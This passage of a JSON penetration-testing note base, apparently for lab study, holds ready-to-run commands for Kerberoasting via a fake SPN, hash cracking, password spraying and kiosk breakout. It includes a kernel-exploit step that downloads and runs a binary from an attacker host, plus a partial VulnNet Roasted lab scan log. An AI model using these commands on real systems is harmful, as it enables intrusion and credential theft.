          },
          {
            "title": "Add Fake SPN - Linux",
            "codes": [
              {
                "lang": "bash",
                "code": "bloodyAD -d <Domain> -u <User> -p <Pass> --host <DC_IP> set object <TargetUser> servicePrincipalName -v \"fake/spn\""
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Perform Kerberoast",
            "codes": [
              {
                "lang": "bash",
                "code": "impacket-GetUserSPNs -request -dc-ip <DC_IP> <Domain>/<User>:<Pass> -outputfile roast.txt\nnxc ldap <DC_IP> -u <User> -p <Pass> --kerberoasting kerberoast.txt"
              },
              {
                "lang": "powershell",
                "code": "Rubeus.exe kerberoast /user:<TargetUser> /nowrap"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Crack Hash",
            "codes": [
              {
                "lang": "bash",
                "code": "hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -r best64.rule"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Remove Fake SPN",
            "codes": [
              {
                "lang": "bash",
                "code": "setspn -D HTTP/fakehost.<Domain> <TargetUser>"
              },
              {
                "lang": "powershell",
                "code": "Set-DomainObject -Identity <TargetUser> -Clear serviceprincipalname"
              },
              {
                "lang": "bash",
                "code": "bloodyAD -d <Domain> -u <User> -p <Pass> --host <DC_IP> set object <TargetUser> servicePrincipalName"
              }
            ],
            "optional": true,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "If you have GenericWrite/GenericAll on a user, add a fake SPN to make them Kerberoastable."
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Kerberoasting",
    "title": "Kerberoasting",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "Hashcat",
      "Impacket",
      "Kerberoasting",
      "Kerberos",
      "Password_Attack",
      "Privilege_Escalation",
      "Rubeus",
      "Windows"
    ],
    "steps": [
      {
        "title": "Find Kerberoastable Accounts",
        "codes": [
          {
            "lang": "powershell",
            "code": "Get-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName | Select-Object SamAccountName,ServicePrincipalName"
          },
          {
            "lang": "powershell",
            "code": ".\\Rubeus.exe kerberoast /stats"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Find with Hackles (BloodHound)",
        "codes": [
          {
            "lang": "bash",
            "code": "python -m hackles -u neo4j -p '<Neo4jPassword>' --kerberoastable"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false
      },
      {
        "title": "Kerberoast with Rubeus",
        "codes": [
          {
            "lang": "powershell",
            "code": ".\\Rubeus.exe kerberoast /outfile:kerberoast_hashes.txt"
          },
          {
            "lang": "powershell",
            "code": "# Target specific user\n.\\Rubeus.exe kerberoast /user:<ServiceAccount> /outfile:kerberoast_hashes.txt"
          },
          {
            "lang": "powershell",
            "code": "# Request RC4 (easier to crack but more detectable)\n.\\Rubeus.exe kerberoast /rc4opsec /outfile:kerberoast_hashes.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Kerberoast from Kali",
        "codes": [
          {
            "lang": "bash",
            "code": "impacket-GetUserSPNs <Domain>/<Username>:<Password> -dc-ip <DC_IP> -request -outputfile kerberoast.txt"
          },
          {
            "lang": "bash",
            "code": "# Pass the hash\nimpacket-GetUserSPNs -hashes :<NTLMHash> <Domain>/<Username> -dc-ip <DC_IP> -request -outputfile kerberoast.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "Kerberoast with NetExec",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc ldap <DC_IP> -u <Username> -p '<Password>' --kerberoasting kerberoast.txt"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false
      },
      {
        "title": "Crack Hashes - RC4",
        "codes": [
          {
            "lang": "bash",
            "code": "hashcat -m 13100 kerberoast.txt rockyou.txt -r /opt/hashcat/rules/best64.rule"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "Crack Hashes - AES-256",
        "codes": [
          {
            "lang": "bash",
            "code": "hashcat -m 19700 kerberoast.txt rockyou.txt -r /opt/hashcat/rules/best64.rule"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false
      },
      {
        "title": "Validate Cracked Credentials",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <DC_IP> -u <ServiceAccount> -p '<CrackedPassword>' -d <Domain>"
          },
          {
            "lang": "bash",
            "code": "# Check for admin access across subnet\nnxc smb 192.168.1.0/24 -u <ServiceAccount> -p '<CrackedPassword>' -d <Domain>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      }
    ],
    "resources": [
      {
        "text": "HackTricks Kerberoasting",
        "url": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Request TGS tickets for service accounts (accounts with SPNs) and crack offline. Any domain user can request these tickets.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Active Directory and Kerberos Attacks",
    "title": "Kerberos Error Reference",
    "tags": [
      "Active_Directory",
      "Kerberos",
      "Windows"
    ],
    "steps": [],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "**KDC_ERR_PREAUTH_REQUIRED** - User exists, pre-auth needed (valid username)\n**KDC_ERR_C_PRINCIPAL_UNKNOWN** - User doesn't exist\n**KDC_ERR_PREAUTH_FAILED** - Wrong password\n**KDC_ERR_CLIENT_REVOKED** - Account disabled/locked\n**Clock skew too great** - Time sync issue, run `ntpdate <DC_IP>`\n**Server not found in Kerberos database** - DNS issue, add to `/etc/hosts`"
      }
    ]
  },
  {
    "category": "Mimikatz",
    "title": "Kerberos Ticket Manipulation",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "Mimikatz",
      "Windows"
    ],
    "steps": [
      {
        "title": "Request TGT for User",
        "codes": [
          {
            "lang": "bash",
            "code": "mimikatz # kerberos::ask /target:<SPN>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Request TGS for Service",
        "codes": [
          {
            "lang": "bash",
            "code": "mimikatz # kerberos::ask /target:<SPN>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Renew Ticket",
        "codes": [
          {
            "lang": "bash",
            "code": "mimikatz # kerberos::renew"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "advanced": true
  },
  {
    "category": "Password Spraying",
    "title": "Kerbrute Password Spray",
    "tags": [
      "Credential_Access",
      "Initial_Access",
      "Password_Attack"
    ],
    "steps": [
      {
        "title": "Uses Kerberos (Faster)",
        "codes": [
          {
            "lang": "bash",
            "code": "kerbrute passwordspray --dc <TargetIP> -d <Domain> /root/machines/<Machine>/<TargetIP>/usernames 'Spring2024!' -v"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Passwords might be rejected because **RC4 encryption is disabled** on the domain. Kerbrute uses RC4 (NTLM hash-based) for Kerberos pre-auth by default, but many modern domains enforce **AES-only**.",
            "variant": "warning"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Kernel Exploitation",
    "title": "Kernel Exploitation",
    "tags": [
      "Binary_Exploitation",
      "Exploitation",
      "Privilege_Escalation",
      "Windows"
    ],
    "steps": [
      {
        "title": "Analyze WES Output",
        "codes": [
          {
            "lang": "bash",
            "code": "# Common high-value CVEs to look for\n# CVE-2021-1732 - Win32k (Windows 10)\n# CVE-2020-0787 - BITS (Windows 7-10)\n# CVE-2019-1388 - UAC Bypass (Windows 7-10)\n# CVE-2018-8120 - Win32k (Windows 7, Server 2008)\n# CVE-2017-0213 - COM Aggregate Marshaler (Windows 10)\n# CVE-2016-3309 - Win32k (Windows 7-10)\n# CVE-2015-1701 - Win32k (Windows 7)"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "**WES** outputs CVEs with available exploits. Search for pre-compiled binaries or compile from source.",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Download and Execute Exploit",
        "codes": [
          {
            "lang": "powershell",
            "code": "# Download pre-compiled exploit\n(New-Object Net.WebClient).DownloadFile('http://<KaliIP>/all/<ExploitName>.exe','exploit.exe')\n\n.\\exploit.exe"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Common Exploit Repositories",
        "codes": [
          {
            "lang": "bash",
            "code": "# SecWiki collection (pre-compiled)\ngit clone https://github.com/SecWiki/windows-kernel-exploits\n\n# Search for specific CVE\nfind /opt/windows-kernel-exploits -name \"*<CVE>*\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "Watson - .NET Exploit Suggester",
        "codes": [
          {
            "lang": "powershell",
            "code": "(New-Object Net.WebClient).DownloadFile('http://<KaliIP>/all/Watson.exe','watson.exe')\n.\\watson.exe"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Runs directly on target, no need to transfer systeminfo. Requires .NET 4.5+.",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "Windows Exploit Suggester",
        "url": "https://github.com/bitsadmin/wesng"
      },
      {
        "text": "Pre-compiled Exploits",
        "url": "https://github.com/SecWiki/windows-kernel-exploits"
      }
    ],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "**Last resort** - kernel exploits can BSOD the system. Always try misconfigurations first.",
        "variant": "danger"
      }
    ]
  },
  {
    "category": "Linux Privilege Escalation",
    "title": "Kernel Exploits",
    "tags": [
      "Linux",
      "Post_Exploitation",
      "Privilege_Escalation"
    ],
    "steps": [
      {
        "title": "Check Kernel Version",
        "codes": [
          {
            "lang": "bash",
            "code": "uname -a\ncat /proc/version"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Search for Kernel Exploits",
        "codes": [
          {
            "lang": "bash",
            "code": "searchsploit linux kernel <version>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Common Kernel Exploits",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Kernel exploits can crash the system. Use as last resort.\n- **DirtyCow (CVE-2016-5195)** - Linux Kernel 2.6.22 < 3.9\n- **Dirty Pipe (CVE-2022-0847)** - Linux Kernel 5.8 - 5.16.11\n- **PwnKit (CVE-2021-4034)** - Polkit pkexec",
            "variant": "warning"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Windows Kiosk Breakout",
    "title": "Keyboard Shortcuts",
    "tags": [
      "Defense_Evasion",
      "Mobile",
      "Privilege_Escalation",
      "Windows"
    ],
    "steps": [
      {
        "title": "Try These First",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Common escape shortcuts:\n- **Ctrl+Alt+Del** - Security options\n- **Win+R** - Run dialog (often blocked)\n- **Win+E** - Explorer (often blocked)\n- **Ctrl+Shift+Esc** - Task Manager\n- **Win+X** - Power user menu\n- **F1** - Help (may open browser)",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Accessibility Shortcuts",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Accessibility exploits:\n- **Win+U** - Ease of Access Center\n- **Shift x5** - Sticky Keys dialog\n- **Right Shift (8 sec)** - Filter Keys\n- **Left Alt+Left Shift+Print Screen** - High Contrast",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Linux Kiosk Breakout",
    "title": "Kiosk Enumeration",
    "tags": [
      "Defense_Evasion",
      "Linux",
      "Mobile",
      "Privilege_Escalation"
    ],
    "steps": [
      {
        "title": "Identify Kiosk Type",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Common kiosk types:\n- Browser-based kiosk (Firefox, Chrome)\n- Application-specific kiosk\n- Custom GUI application",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Browser Enumeration",
        "codes": [
          {
            "lang": "text",
            "code": "# Try these in URL bar:\nfile:///\nfile:///etc/passwd\nfile:///home/\nabout:config (Firefox)\nchrome://settings (Chrome)"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Keyboard Shortcuts to Try",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Try these keyboard shortcuts:\n- **Ctrl+Alt+T** - Terminal (Ubuntu)\n- **Ctrl+Alt+F1-F6** - Virtual consoles\n- **Alt+F2** - Run dialog\n- **Ctrl+Shift+Esc** - Task manager\n- **Alt+Tab** - Window switcher",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "Kiosk Breakout Techniques",
        "url": "https://book.hacktricks.wiki/en/hardware-physical-access/escaping-from-gui-applications.html"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Kiosk systems restrict users to specific applications. Goal is to escape to shell access.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Lab Machine Setup",
    "title": "Lab Machine Template",
    "tags": [],
    "steps": [
      {
        "title": "Scenario Description",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Brief description of the box and attack path summary once complete."
          }
        ]
      },
      {
        "title": "Learning Objectives",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Skills and techniques this box is designed to teach."
          }
        ]
      },
      {
        "title": "Provided Credentials",
        "substeps": [
          {
            "title": "Username",
            "codes": [
              {
                "lang": "text",
                "code": "<Username>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Password",
            "codes": [
              {
                "lang": "text",
                "code": "<Password>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": true,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Create Directory Structure",
        "codes": [
          {
            "lang": "bash",
            "code": "alias WD=/root/machines/<MachineName>/<TargetIP> && mkdir -p $WD/{logs,web,scan,nxc,exploit,bloodhound,loot,privesc,www} && cd $WD && touch usernames passwords confirmedCreds notes && ls"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Launch Logged Terminal Tabs",
        "codes": [
          {
            "lang": "bash",
            "code": "alias WD=/root/machines/<MachineName>/<TargetIP> && alias TS=$(date +%Y%m%d_%H%M) && xfce4-terminal --maximize --hide-menubar --hide-toolbar --working-directory=$WD/ --title=\"Shell\" -e \"script -q -f $WD/logs/shell_$TS.log\" --tab --working-directory=$WD/scan --title=\"Scan\" -e \"script -q -f $WD/logs/scan_$TS.log\" --tab --working-directory=$WD/nxc --title=\"NXC\" -e \"script -q -f $WD/logs/nxc_$TS.log\" --tab --working-directory=$WD/web --title=\"Web\" -e \"script -q -f $WD/logs/web_$TS.log\" --tab --working-directory=$WD/exploit --title=\"Exploit\" -e \"script -q -f $WD/logs/exploit_$TS.log\" --tab --working-directory=$WD/ --title=\"Notes\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Maximize Terminal Window",
        "codes": [
          {
            "lang": "bash",
            "code": "wmctrl -r :ACTIVE: -b add,maximized_vert,maximized_horz"
          }
        ],
        "optional": true,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Enumeration",
        "substeps": [
          {
            "title": "RustScan TCP",
            "codes": [
              {
                "lang": "bash",
                "code": "rustscan -a <TargetIP> --ulimit 5000 -b 1500 -- -sC -sV -Pn -oN scan.txt"
              },
              {
                "lang": "text",
                "code": "# Output"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Nmap UDP",
            "codes": [
              {
                "lang": "bash",
                "code": "nmap -sU --top-ports 20 -sV <TargetIP> -oN udp_scan.txt"
              },
              {
                "lang": "text",
                "code": "# Output"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "authfinder",
            "codes": [
              {
                "lang": "bash",
                "code": "cd /opt/authfinder && python3 authfinder.py <TargetIP> '<Username>' '<Password>'"
              },
              {
                "lang": "text",
                "code": "# Output"
              }
            ],
            "optional": true,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "nxc_enum",
            "codes": [
              {
                "lang": "bash",
                "code": "cd /opt/nxc_enum && python -m nxc_enum <TargetIP> -u '<Username>' -p '<Password>' -A --copy-paste -o /root/machines/<MachineName>/<TargetIP>/nxc/nxc_enum_results.txt"
              },
              {
                "lang": "text",
                "code": "# Output"
              }
            ],
            "optional": true,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Impacket Shell",
            "codes": [
              {
                "lang": "bash",
                "code": "cd /opt/impacket-shell && python -m impacket_shell --target <TargetIP> -u <Username> -p '<Password>' -d <Domain> -vv -A --log /root/machines/<MachineName>/<TargetIP>/impacket_shell.txt"
              },
              {
                "lang": "text",
                "code": "# Output"
              }
            ],
            "optional": true,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Web Enumeration",
        "substeps": [
          {
            "title": "Directory Busting",
            "codes": [
              {
                "lang": "bash",
                "code": "feroxbuster -u http://<TargetIP> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o ferox.txt"
              },
              {
                "lang": "text",
                "code": "# Output"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Vulnerability Scan",
            "codes": [
              {
                "lang": "bash",
                "code": "nikto -h http://<TargetIP> -o nikto.txt"
              },
              {
                "lang": "text",
                "code": "# Output"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Subdomain Enumeration",
            "codes": [
              {
                "lang": "bash",
                "code": "ffuf -u http://<TargetIP> -H \"Host: FUZZ.<Domain>\" -w /usr/share/seclists/Discovery/Web-Content/subdomains-top1million-5000.txt -fc 301,302 -o subs.txt"
              },
              {
                "lang": "text",
                "code": "# Output"
              }
            ],
            "optional": true,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": true,
        "alternative": false,
        "remote": false,
        "local": false,
        "codes": [
          {
            "lang": "bash",
            "code": "cd /root/machines/<MachineName>/<TargetIP>/web"
          }
        ]
      },
      {
        "title": "Initial Foothold",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Document how initial access was obtained."
          }
        ]
      },
      {
        "title": "Privilege Escalation",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Document privesc path."
          }
        ]
      },
      {
        "title": "Potential Credentials Discovered",
        "substeps": [
          {
            "title": "Username",
            "codes": [
              {
                "lang": "text",
                "code": "<Username>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Password",
            "codes": [
              {
                "lang": "text",
                "code": "<Password>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Hash",
            "codes": [
              {
                "lang": "text",
                "code": "<NTHash>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Credentials Discovered",
        "substeps": [
          {
            "title": "Username",
            "codes": [
              {
                "lang": "text",
                "code": "<Username>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Password",
            "codes": [
              {
                "lang": "text",
                "code": "<Password>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Hash",
            "codes": [
              {
                "lang": "text",
                "code": "<NTHash>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Lessons Learned",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Key takeaways and techniques to remember."
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "RustScan",
        "url": "https://github.com/RustScan/RustScan"
      },
      {
        "text": "feroxbuster",
        "url": "https://github.com/epi052/feroxbuster"
      },
      {
        "text": "nikto",
        "url": "https://github.com/sullo/nikto"
      },
      {
        "text": "ffuf",
        "url": "https://github.com/ffuf/ffuf"
      },
      {
        "text": "nmap",
        "url": "https://github.com/nmap/nmap"
      },
      {
        "text": "SecLists",
        "url": "https://github.com/danielmiessler/SecLists"
      },
      {
        "text": "authfinder",
        "url": "https://github.com/Real-Fruit-Snacks/authfinder"
      },
      {
        "text": "nxc_enum",
        "url": "https://github.com/Real-Fruit-Snacks/nxc_enum"
      }
    ],
    "lab": true,
    "notes": [
      {
        "type": "note",
        "content": "Copy this template to `/notes/Machines/` when starting a new box. Update the title, tags, and fill in sections as you progress.",
        "variant": "tip"
      },
      {
        "type": "note",
        "content": "Machine Info\n- **Platform**: HTB / OSCP / PG Practice\n- **Difficulty**: Easy / Medium / Hard\n- **OS**: Linux / Windows\n- **IP Address**: x.x.x.x\n- **Domain**: [optional - for AD environments]\n- **Date Started**:\n- **Date Completed**:\n- **User Flag**:\n- **Root Flag**:\n- **Target Hostname**: [optional]\n- **Target FQDN**: [optional]",
        "variant": "info"
      }
    ]
  },
  {
    "category": "VulnNet Roasted - Lab Machine",
    "title": "Lab Machine Template",
    "tags": [],
    "steps": [
      {
        "title": "Scenario Description",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "VulnNet Entertainment just deployed a new instance on their network with the newly-hired system administrators. Being a security-aware company, they as always hired you to perform a penetration test, and see how system administrators are performing."
          }
        ]
      },
      {
        "title": "Create Directory Structure",
        "codes": [
          {
            "lang": "bash",
            "code": "alias WD=/root/machines/VulnNetRoasted/10.64.131.199 && mkdir -p $WD/{logs,web,scan,nxc,exploit,bloodhound,loot,privesc,www} && cd $WD && touch usernames passwords confirmedCreds notes && ls"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Launch Logged Terminal Tabs",
        "codes": [
          {
            "lang": "bash",
            "code": "alias WD=/root/machines/VulnNetRoasted/10.64.131.199 && alias TS=$(date +%Y%m%d_%H%M) && xfce4-terminal --maximize --hide-menubar --hide-toolbar --working-directory=$WD/ --title=\"Shell\" -e \"script -q -f $WD/logs/shell_$TS.log\" --tab --working-directory=$WD/scan --title=\"Scan\" -e \"script -q -f $WD/logs/scan_$TS.log\" --tab --working-directory=$WD/nxc --title=\"NXC\" -e \"script -q -f $WD/logs/nxc_$TS.log\" --tab --working-directory=$WD/web --title=\"Web\" -e \"script -q -f $WD/logs/web_$TS.log\" --tab --working-directory=$WD/exploit --title=\"Exploit\" -e \"script -q -f $WD/logs/exploit_$TS.log\" --tab --working-directory=$WD/ --title=\"Notes\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Maximize Terminal Window",
        "codes": [
          {
            "lang": "bash",
            "code": "wmctrl -r :ACTIVE: -b add,maximized_vert,maximized_horz"
          }
        ],
        "optional": true,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Enumeration",
        "substeps": [
          {
            "title": "RustScan TCP",
            "codes": [
              {
                "lang": "bash",
                "code": "rustscan -a 10.64.131.199 --ulimit 5000 -b 1500 -- -sC -sV -Pn -oN scan.txt"
              },
              {
                "lang": "text",
                "code": "# Output\nOpen 10.64.131.199:53\nOpen 10.64.131.199:88\nOpen 10.64.131.199:139\nOpen 10.64.131.199:135\nOpen 10.64.131.199:389\nOpen 10.64.131.199:445\nOpen 10.64.131.199:464\nOpen 10.64.131.199:593\nOpen 10.64.131.199:3269\nOpen 10.64.131.199:3268\nOpen 10.64.131.199:5985\nOpen 10.64.131.199:9389\nOpen 10.64.131.199:49667\nOpen 10.64.131.199:49668\nOpen 10.64.131.199:49670\nOpen 10.64.131.199:49669\nOpen 10.64.131.199:49671\nOpen 10.64.131.199:49699\nOpen 10.64.131.199:49714\n\nPORT      STATE SERVICE       REASON          VERSION\n53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus\n\n88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2026-02-04 00:21:17Z)\n\n135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC\n\n139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn\n\n389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)\n\n445/tcp   open  microsoft-ds? syn-ack ttl 126\n\n464/tcp   open  kpasswd5?     syn-ack ttl 126\n\n593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0\n\n3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)\n\n3269/tcp  open  tcpwrapped    syn-ack ttl 126\n\n5985/tcp  open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n\n9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing\n49667/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC\n49668/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0\n49669/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC\n49670/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC\n49671/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC\n49699/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC\n49714/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC\n\nService Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Nmap UDP",
            "codes": [
              {
                "lang": "bash",
                "code": "nmap -sU --top-ports 20 -sV 10.64.131.199 -oN udp_scan.txt"
              },
              {
                "lang": "text",
                "code": "# Output\nPORT      STATE         SERVICE      VERSION\n53/udp    open          domain       (generic dns response: NOTIMP)\n67/udp    open|filtered dhcps\n68/udp    open|filtered dhcpc\n69/udp    open|filtered tftp\n123/udp   open          ntp          NTP v3\n135/udp   open|filtered msrpc\n137/udp   open|filtered netbios-ns\n138/udp   open|filtered netbios-dgm\n139/udp   open|filtered netbios-ssn\n161/udp   open|filtered snmp\n162/udp   open|filtered snmptrap\n445/udp   open|filtered microsoft-ds\n500/udp   open|filtered isakmp\n514/udp   open|filtered syslog\n520/udp   open|filtered route\n631/udp   open|filtered ipp\n1434/udp  open|filtered ms-sql-m\n1900/udp  open|filtered upnp\n4500/udp  open|filtered nat-t-ike\n49152/udp open|filtered unknown\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port53-UDP:V=7.95%I=7%D=2/3%Time=698291A1%P=x86_64-pc-linux-gnu%r(DNS-S\nSF:D,2E,\"\\0\\0\\x80\\x82\\0\\x01\\0\\0\\0\\0\\0\\0\\t_services\\x07_dns-sd\\x04_udp\\x05l\nSF:ocal\\0\\0\\x0c\\0\\x01\")%r(NBTStat,32,\"\\x80\\xf0\\x80\\x82\\0\\x01\\0\\0\\0\\0\\0\\0\\x\nSF:20CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\0\\0!\\0\\x01\");\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 123.84 seconds"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "nxc_enum",
            "codes": [
              {
                "lang": "bash",
                "code": "cd /opt/nxc_enum && python -m nxc_enum 10.64.131.199 -A --copy-paste -o /root/machines/VulnNetRoasted/10.64.131.199/nxc/nxc_enum_results.txt"
              },
              {
                "lang": "text",
